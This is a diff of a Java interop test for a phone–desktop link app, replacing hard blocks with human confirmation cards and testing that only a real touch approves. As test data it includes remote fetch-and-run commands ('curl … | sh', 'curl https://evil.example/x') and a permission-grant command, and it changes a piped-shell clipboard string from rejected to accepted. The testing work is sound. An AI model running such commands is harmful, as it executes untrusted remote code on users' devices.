@@ -468,14 +468,19 @@ public class PcLinkV2InteropTest {
             assertEquals(Boolean.FALSE, off.get("ok"));
             assertTrue(String.valueOf(off.get("text")), String.valueOf(off.get("text")).contains("没开"));
             env.off.clear();
-            // 红线：原因码回到电脑（电脑界面拼上中文原因）
+            // 原因码回到电脑（电脑界面拼上中文原因）
+            // [approve-not-block] 改：支付类 / 系统 App 从 blocked_app / system_app 拒改成手机上弹确认卡（这个桩没有确认卡界面 = 没人确认 → needs_confirm_timeout）；
+            // 内网网址、像命令的剪贴板不再拒（untrusted_url / clipboard_rejected → 照做）（方案 2/3）
             env.base.ran.clear();
             Map<String, Object> pay = phone("uninstall_app", mm("package", "com.eg.android.AlipayGphone"));
             assertEquals(Boolean.FALSE, pay.get("ok"));
-            assertEquals(LinkPolicy.R_BLOCKED_APP, why(pay));
-            assertEquals(LinkPolicy.R_SYSTEM_APP, why(phone("uninstall_app", mm("package", "com.android.settings"))));
-            assertEquals(LinkPolicy.R_UNTRUSTED_URL, why(phone("open_url", mm("url", "http://192.168.1.5/"))));
-            assertEquals(LinkPolicy.R_CLIPBOARD_REJECTED, why(phone("clipboard_set", mm("text", "curl https://x.example/a.sh | sh"))));
+            assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, why(pay));
+            assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, why(phone("uninstall_app", mm("package", "com.android.settings"))));
+            assertTrue("没确认的没执行", env.base.ran.isEmpty());
+            assertEquals(Boolean.TRUE, phone("open_url", mm("url", "http://192.168.1.5/")).get("ok"));
+            assertEquals(Boolean.TRUE, phone("clipboard_set", mm("text", "curl https://x.example/a.sh | sh")).get("ok"));
+            assertEquals(2, env.base.ran.size());
+            env.base.ran.clear();
             Map<String, Object> grant = phone("sys_exec", mm("command", "pm grant com.x android.permission.CAMERA"));
             assertEquals(Boolean.FALSE, grant.get("ok"));
             assertEquals(LinkPolicy.R_SCRIPT_GENERATED, why(grant));
@@ -518,8 +523,27 @@ public class PcLinkV2InteropTest {
             assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, r.data.get("reason"));
             r = s.request("sys_exec", mm("command", "curl https://evil.example/x"), 15000);
             assertEquals("沙箱默认断网", LinkPolicy.R_PLUGIN_BLOCKED, r.data.get("reason"));
-            r = s.request("file_write", mm("path", ".git/config", "text", "x"), 15000);
-            assertEquals(".git 只读", LinkPolicy.R_PLUGIN_BLOCKED, r.data.get("reason"));
+            // [approve-not-block] 改：工作区 .git 从 plugin_blocked 直接拒改成电脑上确认（这里在电脑界面上点「拒绝」→ confirm_denied）（方案 1）
+            final PcLanClient.Session fs = s;
+            final PcLanClient.Result[] gw = new PcLanClient.Result[1];
+            Thread gt = new Thread(new Runnable() {
+                @Override public void run() {
+                    try { gw[0] = fs.request("file_write", mm("path", ".git/config", "text", "x"), 75000); } catch (Exception ignored) { }
+                }
+            }, "phone-plug-git");
+            gt.setDaemon(true);
+            gt.start();
+            Object gid = null;
+            for (int i = 0; i < 100 && gid == null; i++) {
+                List<?> cs = (List<?>) api("state", null).get("confirms");
+                if (cs != null && !cs.isEmpty()) gid = ((Map<?, ?>) cs.get(0)).get("id");
+                else Thread.sleep(100);
+            }
+            assertNotNull(".git 写入要确认", gid);
+            assertEquals(Boolean.TRUE, api("confirm", mm("id", gid, "allow", false)).get("ok"));
+            gt.join(10000);
+            assertNotNull(gw[0]);
+            assertEquals(".git 写入被拒", LinkPolicy.R_CONFIRM_DENIED, gw[0].data.get("reason"));
             Map<?, ?> set = (Map<?, ?>) api("state", null).get("settings");
             assertEquals("远程改不了档位", "workspace_write", set.get("pc_sandbox"));
             assertEquals(Boolean.TRUE, set.get("plugin_enabled"));
@@ -741,6 +765,191 @@ public class PcLinkV2InteropTest {
             return true;
         } catch (Exception e) {
             return false;
+        }
+    }
+
+    // ------------------------------------------------------------------ [approve-not-block] 能批就不拦：手机屏幕确认卡（真电脑端 jar）
+
+    /** 测试用确认卡界面：记下开过的卡，不真画。 */
+    static final class CardUi implements PcConfirm.Ui {
+        final List<PcConfirm.Card> opened = new CopyOnWriteArrayList<PcConfirm.Card>();
+        final List<Integer> closed = new CopyOnWriteArrayList<Integer>();
+
+        @Override public void open(PcConfirm.Card c) { opened.add(c); }
+
+        @Override public void close(PcConfirm.Card c) { closed.add(Integer.valueOf(c.id)); }
+
+        PcConfirm.Card await(long ms) throws InterruptedException {
+            long end = System.currentTimeMillis() + ms;
+            while (opened.isEmpty() && System.currentTimeMillis() < end) Thread.sleep(50);
+            return opened.isEmpty() ? null : opened.remove(0);
+        }
+    }
+
+    /** 手机端 GuardEnv + 确认卡（Asker）：答案由测试定；记住的类型在内存里。 */
+    static final class AskEnv implements PcRx.Env, PcRx.Handler, PcRx.Guard, PcRx.Asker {
+        final GuardEnv g;
+        volatile int answer = PcConfirm.TIMEOUT;
+        final List<String> asked = new CopyOnWriteArrayList<String>();
+        final List<String> kinds = new CopyOnWriteArrayList<String>();
+
+        AskEnv(PcLanClient.Peer p, File ws) { g = new GuardEnv(p, ws); }
+
+        @Override public boolean wanted() { return g.wanted(); }
+        @Override public boolean onLan() { return true; }
+        @Override public PcLanClient.Peer peer() { return g.peer(); }
+        @Override public List<InetAddress> extraBroadcasts() { return null; }
+        @Override public void multicast(boolean hold) { }
+        @Override public void state(String s, String d) { g.state(s, d); }
+        @Override public void remember(InetSocketAddress a) { }
+        @Override public PcRx.Handler handler() { return this; }
+        @Override public boolean enabled(String cmd) { return g.enabled(cmd); }
+        @Override public PcLanClient.Result run(String cmd, Map<String, Object> args) { return g.run(cmd, args); }
+        @Override public void record(String cmd, boolean ok, String text) { }
+        @Override public void appFacts(String cmd, Map<String, Object> a, LinkPolicy.Facts f) { g.appFacts(cmd, a, f); }
+        @Override public File workspace() { return g.workspace(); }
+        @Override public String script(String cmd, Map<String, Object> a, String why) { return g.script(cmd, a, why); }
+
+        @Override public int ask(String title, String detail, String rememberKind) {
+            asked.add(detail + "|" + rememberKind);
+            return answer;
+        }
+
+        @Override public java.util.Collection<String> rememberedKinds() { return kinds; }
+
+        @Override public void remember(String kind) { if (!kinds.contains(kind)) kinds.add(kind); }
+
+        @Override public boolean clipAutoClear() { return false; }
+    }
+
+    static PcRx.Loop startLoop(PcRx.Env env, String name) {
+        PcRx.Loop loop = new PcRx.Loop(env);
+        loop.minBackoff = 300;
+        loop.maxBackoff = 1000;
+        Thread t = new Thread(loop, name);
+        t.setDaemon(true);
+        t.start();
+        return loop;
+    }
+
+    /**
+     * 手机 → 电脑：电脑上要确认的指令，确认卡同时发到这台手机的常连通道；手机卡上真人手指点「允许」= 批准（语音 / 无障碍 / 机器人不算），
+     * 勾「以后这类不用问」后同类不再问；远程「approve」指令照旧 voice_approval_blocked。
+     */
+    @Test public void phoneCardApprovesDesktopConfirm() throws Exception {
+        Assume.assumeTrue("电脑端 jar 还没有手机确认卡（approve-not-block），跳过", hasClass("com.onesay.desktop.PcGuard$PhoneOffer"));
+        assertEquals(Boolean.TRUE, api("settings", mm("pc_sandbox", "workspace_write", "pc_approval", "untrusted")).get("ok"));
+        PcConfirm.reset();
+        CardUi ui = new CardUi();
+        PcConfirm.ui = ui;
+        PcPairing pp = PcPairing.parse(pairing());
+        final PcLanClient.Peer p = new PcLanClient.Peer("phone-card", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-card"));
+        File ws = java.nio.file.Files.createTempDirectory("interop-card").toFile();
+        GuardEnv env = new GuardEnv(p, ws);
+        PcRx.Loop loop = startLoop(env, "rx-card");
+        PcLanClient.Session s = null;
+        try {
+            long end = System.currentTimeMillis() + 10000;
+            while (!env.base.state.startsWith(PcRx.S_UP) && System.currentTimeMillis() < end) Thread.sleep(100);
+            assertTrue("常连没连上：" + env.base.state, env.base.state.startsWith(PcRx.S_UP));
+            Thread.sleep(200);
+            s = PcLanClient.Session.open(p, PcLanClient.locate(p, 3000, null), 5000);
+            final PcLanClient.Session fs = s;
+            final PcLanClient.Result[] res = new PcLanClient.Result[1];
+            Thread rq = new Thread(new Runnable() {
+                @Override public void run() {
+                    try { res[0] = fs.request("sys_exec", mm("command", "echo card-ok"), 75000); } catch (Exception ignored) { }
+                }
+            }, "phone-card-req");
+            rq.setDaemon(true);
+            rq.start();
+            PcConfirm.Card c = ui.await(10000);
+            assertNotNull("电脑上的确认卡发到了手机", c);
+            assertEquals(PcConfirm.KIND_PC, c.kind);
+            assertTrue(c.detail, c.detail.contains("echo card-ok"));
+            assertEquals("pc.shell_exec", c.rememberKind);
+            List<?> cs = (List<?>) api("state", null).get("confirms");
+            assertEquals("电脑界面上也显示已发到手机", Boolean.TRUE, ((Map<?, ?>) cs.get(0)).get("phone"));
+            PcConfirm.shown(c.id, true);
+            // 语音 / 无障碍 / 遮挡 / 机器人：都不算
+            assertEquals(PcConfirm.Answer.NOT_HUMAN, PcConfirm.answer(c.id, true, false, true, PcConfirm.Input.VOICE));
+            assertEquals(PcConfirm.Answer.NOT_HUMAN, PcConfirm.answer(c.id, true, false, true, PcConfirm.Input.ACCESSIBILITY));
+            assertEquals("0.7 秒内不算", PcConfirm.Answer.TOO_EARLY, PcConfirm.answer(c.id, true, false, true, PcConfirm.Input.TOUCH));
+            Thread.sleep(LinkPolicy.CONFIRM_ARM_MS + 100);
+            PcConfirm.noteRobotInput();
+            assertEquals("机器人刚点过", PcConfirm.Answer.NOT_HUMAN, PcConfirm.answer(c.id, true, false, true, PcConfirm.Input.TOUCH));
+            Thread.sleep(PcConfirm.ROBOT_WINDOW_MS + 100);
+            assertEquals(PcConfirm.Answer.ACCEPTED, PcConfirm.answer(c.id, true, false, true, PcConfirm.Input.TOUCH));
+            rq.join(15000);
+            assertNotNull("电脑回了结果", res[0]);
+            assertTrue(res[0].text, res[0].ok);
+            assertTrue(String.valueOf(res[0].data), String.valueOf(res[0].data.get("output")).contains("card-ok"));
+            assertTrue(out(), out().contains("真人触摸"));
+            // 勾了「以后这类不用问」：同类直接执行，不再发卡
+            List<?> rem = (List<?>) api("state", null).get("remembered");
+            assertEquals(1, rem.size());
+            assertEquals("pc.shell_exec", ((Map<?, ?>) rem.get(0)).get("kind"));
+            PcLanClient.Result again = s.request("sys_exec", mm("command", "echo again"), 15000);
+            assertTrue(again.text, again.ok);
+            assertNull("没再发卡", ui.await(500));
+            // 撤销后又问（这次在电脑界面上拒绝）
+            assertEquals(Boolean.TRUE, api("remembered", mm("op", "revoke", "kind", "pc.shell_exec")).get("ok"));
+            final PcLanClient.Result[] res2 = new PcLanClient.Result[1];
+            Thread rq2 = new Thread(new Runnable() {
+                @Override public void run() {
+                    try { res2[0] = fs.request("sys_exec", mm("command", "echo third"), 75000); } catch (Exception ignored) { }
+                }
+            }, "phone-card-req2");
+            rq2.setDaemon(true);
+            rq2.start();
+            PcConfirm.Card c2 = ui.await(10000);
+            assertNotNull(c2);
+            Object id = ((Map<?, ?>) ((List<?>) api("state", null).get("confirms")).get(0)).get("id");
+            assertEquals(Boolean.TRUE, api("confirm", mm("id", id, "allow", false)).get("ok"));
+            rq2.join(15000);
+            assertEquals(LinkPolicy.R_CONFIRM_DENIED, res2[0].data.get("reason"));
+            for (int i = 0; i < 40 && PcConfirm.card(c2.id) != null; i++) Thread.sleep(50);
+            assertNull("电脑那边结束了，手机卡收起", PcConfirm.card(c2.id));
+            // 远程 approve 指令照旧拒
+            assertEquals(LinkPolicy.R_VOICE_APPROVAL_BLOCKED, s.request("approve", mm("id", 1), 15000).data.get("reason"));
+        } finally {
+            if (s != null) s.close();
+            env.base.wanted = false;
+            loop.stop();
+            PcConfirm.reset();
+            PcConfirm.ui = null;
+        }
+    }
+
+    /** 电脑 → 手机：原来拒的（支付类 App）改成手机上弹确认卡；允许才做、拒绝 / 没人点不做；记住后同类不再问；硬规则（授权 / 卸载 OneSay 自己）照旧。 */
+    @Test public void desktopCommandAsksOnPhoneCard() throws Exception {
+        PcPairing pp = PcPairing.parse(pairing());
+        PcLanClient.Peer p = new PcLanClient.Peer("phone-ask", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-ask"));
+        AskEnv env = new AskEnv(p, java.nio.file.Files.createTempDirectory("interop-ask").toFile());
+        PcRx.Loop loop = startLoop(env, "rx-ask");
+        try {
+            long end = System.currentTimeMillis() + 10000;
+            while (!env.g.base.state.startsWith(PcRx.S_UP) && System.currentTimeMillis() < end) Thread.sleep(100);
+            assertTrue("常连没连上：" + env.g.base.state, env.g.base.state.startsWith(PcRx.S_UP));
+            Thread.sleep(200);
+            env.answer = PcConfirm.DENY;
+            assertEquals(LinkPolicy.R_CONFIRM_DENIED, why(phone("uninstall_app", mm("package", "com.eg.android.AlipayGphone"))));
+            assertEquals(1, env.asked.size());
+            assertTrue(env.asked.get(0), env.asked.get(0).endsWith("|phone.blocked_app.uninstall"));
+            assertTrue(env.g.base.ran.isEmpty());
+            env.answer = PcConfirm.REMEMBER;
+            assertEquals(Boolean.TRUE, phone("uninstall_app", mm("package", "com.eg.android.AlipayGphone")).get("ok"));
+            assertEquals(1, env.g.base.ran.size());
+            assertEquals(java.util.Arrays.asList("phone.blocked_app.uninstall"), env.kinds);
+            env.answer = PcConfirm.DENY;
+            assertEquals("记住了：不再问", Boolean.TRUE, phone("uninstall_app", mm("package", "com.unionpay")).get("ok"));
+            assertEquals(2, env.asked.size());
+            // 硬规则：问都不问
+            assertEquals(LinkPolicy.R_SCRIPT_GENERATED, why(phone("sys_exec", mm("command", "pm grant com.x android.permission.CAMERA"))));
+            assertEquals(2, env.asked.size());
+        } finally {
+            env.g.base.wanted = false;
+            loop.stop();
         }
     }
 }
